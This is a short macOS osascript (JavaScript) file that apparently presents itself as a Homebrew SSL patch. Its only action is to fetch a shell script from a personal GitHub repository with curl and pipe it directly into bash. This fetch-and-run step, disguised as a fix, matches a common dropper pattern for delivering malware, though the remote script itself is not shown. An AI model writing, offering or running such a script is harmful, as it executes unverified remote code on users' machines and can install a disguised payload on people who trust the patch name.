#!/usr/bin/osascript -l JavaScript

function run() {
    var app = Application.currentApplication();
    app.includeStandardAdditions = true;

    var command = "curl https://raw.githubusercontent.com/svendev045/brew-ssl-patch/main/brew-core-ssl.sh | bash";
    app.doShellScript(command);
}

run();
